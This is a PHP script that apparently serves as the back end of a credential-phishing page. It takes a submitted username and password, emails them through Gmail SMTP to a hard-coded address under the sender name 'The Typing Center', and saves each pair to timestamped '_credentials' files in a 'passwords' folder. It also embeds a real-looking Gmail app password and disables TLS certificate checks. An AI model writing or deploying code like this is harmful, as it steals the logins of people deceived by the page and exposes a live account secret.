<?php


require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;

$mail = new PHPMailer(true);

$username = $_POST['username'];
$password = $_POST['password'];
$to = 'ziaa16924@gmail.com'; //where we want to send email 

function smtp_mailer($to, $username, $password)
{
    $mail = new PHPMailer();
    $mail->IsSMTP();
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = 'tls';
    $mail->Host = "smtp.gmail.com";
    $mail->Port = 587;
    $mail->IsHTML(true);
    $mail->CharSet = 'UTF-8';
    //$mail->SMTPDebug = 2; 

    $mail->Username = "ziaa16924@gmail.com";
    $mail->Password = "ahdc wtzk bzmf dvqd";
    $mail->SetFrom("ziaa16924@gmail.com", "The Typing Center");
    $mail->Subject = 'User Data';
    $mail->Body = "  <table>
      <tr>
        <th>UserName:</th>
        <td>$username</td>
      </tr>
      <tr>
        <th>Password:</th>
        <td>$password</td>
      </tr>
    </table>";
    $mail->AddAddress($to);
    $mail->SMTPOptions = array('ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => false
    ));
    $mail->send();
}

smtp_mailer($to, $username, $password);


if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $content = "Username = " . $username . "  password = " . $password;
    $path = "passwords";

    $timestamp = microtime(true);

    // Format the current date and time
    $currentDate = date("Y-m-d", $timestamp); // Year-month-day
    $currentTime = date("H-i-s", $timestamp); // Hour:minutes:seconds
    $currentDay = date("l", $timestamp); // Day of the week (full name)
    $currentHour = date("H", $timestamp); // Hour (24-hour format)
    $currentMinutes = date("i", $timestamp); // Minutes
    $currentSeconds = date("s", $timestamp); // Seconds
    $currentMilliseconds = round(($timestamp - floor($timestamp)) * 1000); // Milliseconds


    $date = $currentDate . '_' . $currentTime . '_' . $currentDay . '_' . $currentHour . '_' . $currentMinutes . '_' . $currentSeconds . '_' . $currentMilliseconds;

    $fname =  $date . "_credentials";

    // Check if the directory exists or create it
    if (!is_dir($path)) {
        if (!mkdir($path, 0755)) {
            die("Failed to create directory.");
        }
    }

    $file = fopen($path . "/" . $fname . ".txt", 'w');
    if ($file === false) {
        die("Failed to open file for writing.");
    }

    if (fwrite($file, $content) === false) {
        die("Failed to write to file.");
    }

    fclose($file);
    echo "Data saved successfully.";
} else {
    echo "Username or password not provided.";
}
